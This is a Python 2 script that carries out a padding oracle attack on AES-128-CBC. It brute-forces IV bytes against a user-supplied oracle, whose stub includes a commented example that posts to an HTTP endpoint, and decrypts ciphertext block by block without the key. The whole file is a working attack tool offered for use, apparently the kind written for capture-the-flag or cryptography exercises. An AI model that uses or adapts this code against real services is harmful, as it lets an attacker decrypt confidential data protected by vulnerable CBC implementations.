import requests
import itertools
import sys

# AES-128-CBC padding oracle attack
# each block is 16 bytes (standard)

def combine(lst):
    return "".join(x for x in lst)

def get_response(hexstring):
    #######################################
    # CUSTOMIZE YOUR ORACLE RESPONSE HERE #
    #######################################

    '''
    ## For example:
    payload = {data_key: hexstring}
    response = str(requests.post(oracle_http_url, data=payload).text)

    if sucessful_indicator in response:
        return hexstring
    '''

def hexstring(i): # we dont want leading 0x
    return hex(i)[2:]

def hex_to_dec(hexstr):
    return int(hexstr, base=16)

def throw_invalid_format():
    raise Exception("Required format: -iv <initialization vector> -ct <ciphertext>")

def main(iv, ciphertext):
    print("** AES-128-CBC Padding Oracle Attack **")
    ct_blocks = [ciphertext[i:i+32] for i in range(0, len(ciphertext), 32)] 
    assert len(ct_blocks[0]) == len(ct_blocks[1]) == len(ct_blocks[2]) == len(ct_blocks[3]) == 32 
    iv_blocks = [iv,] + [ciphertext[i:i+32] for i in range(0, len(ciphertext) - 32, 32)]
    assert len(iv_blocks[0]) == len(iv_blocks[1]) == len(iv_blocks[2]) == len(iv_blocks[3]) == 32

    iv_blocks.reverse() # start working backwards
    ct_blocks.reverse() # start working backwards

    tries = list(itertools.product("0123456789abcdef", repeat=2))
    tries = list(map(lambda x: combine(x), tries))

    decrypt = "" # Dk(CipherText)
    plaintext = ""

    # code block to find out that last block's padding length
    test_iv = [iv_blocks[0][i:i+2] for i in range(0, len(iv_blocks[0]), 2)]
    last_block_count = 0
    while last_block_count != 15:
        test_iv[last_block_count] = 'ff'
        if not get_response(combine(test_iv) + ct_blocks[0]):
            break
        last_block_count += 1
    print(">> Last block's padding value: " + str(16 - last_block_count))
    # count here is last block's LAST non-padding byte

    for j, s in enumerate(iv_blocks): # for each iv & ciphertext pair
        test_iv = [s[i:i+2] for i in range(0, len(s), 2)] # separate iv into pairs
        ct = ct_blocks[j]
        count = 15
        old_padding_value = 1
        new_padding_value = 2 # dummy value
        print(">> Performing padding oracle attack on: Block " + str(len(ct_blocks) - j))
        if j == 0: # dealing with last most byte
            print(">> Checking padding for last ciphertext block...")
            old_padding_value = 16 - last_block_count # 6
            count = last_block_count # 10
            for m in range(count, 16):
                toappend = hexstring(old_padding_value ^ hex_to_dec(test_iv[m]))
                if len(toappend) == 1:
                    toappend = "0" + toappend
                decrypt = toappend + decrypt
            assert len(decrypt) == 2 * old_padding_value
            new_padding_value = old_padding_value + 1
            prev_iv = combine(test_iv)
            for m in range(count, 16):
                initial_byte = prev_iv[m*2: m*2+2]
                test_iv[m] = hexstring(hex_to_dec(initial_byte) ^ old_padding_value ^ new_padding_value)
                if len(test_iv[m]) == 1:
                    test_iv[m] = "0" + test_iv[m]
            count -= 1
            old_padding_value = new_padding_value
        while count != -1:
            success = False
            print(">> Now attacking byte: " + str(count))
            for i in tries: 
                test_iv[count] = i
                output = get_response(combine(test_iv) + ct_blocks[j])
                if output:
                    success = True             
                    print("Accepted IV for decryption: " + output[:32])
                    toappend = hexstring(old_padding_value ^ hex_to_dec(test_iv[count]))
                    if len(toappend) == 1:
                        toappend = "0" + toappend
                    decrypt = toappend + decrypt 
                    new_padding_value = (old_padding_value + 1) 
                    prev_iv = combine(test_iv)
                    for m in range(count, 16):
                        initial_byte = prev_iv[m*2: m*2+2]
                        test_iv[m] = hexstring(hex_to_dec(initial_byte) ^ old_padding_value ^ new_padding_value)
                        if len(test_iv[m]) == 1:
                            test_iv[m] = "0" + test_iv[m]
                    count -= 1
                    old_padding_value = new_padding_value
                    break
            if not success:
                print(">>>> AES-128-CBC padding oracle attack failed.")
                break
        xor = hex_to_dec(decrypt) ^ hex_to_dec(iv_blocks[j])
        toappend = hexstring(xor)
        if type(xor) == long and len(toappend) == 33 and toappend[-1] == "L":
            toappend = toappend[:-1]
        plaintext = toappend + plaintext
        decrypt = ""
        print(">> Block " + str(len(ct_blocks) - j) + " plaintext: " + plaintext.decode("hex"))
    print(">>>> Final plaintext: " + plaintext.decode("hex"))

if __name__ == '__main__':
    # required format: python poa.py -iv <initialization vector> -ct <ciphertext>
    if len(sys.argv) != 5:
        throw_invalid_format()
    for i in ("-iv", "-ct"):
        if i not in sys.argv:
            throw_invalid_format()
    iv_index = sys.argv.index("-iv") + 1
    ct_index = sys.argv.index("-ct") + 1
    main(sys.argv[iv_index].decode(), sys.argv[ct_index].decode())

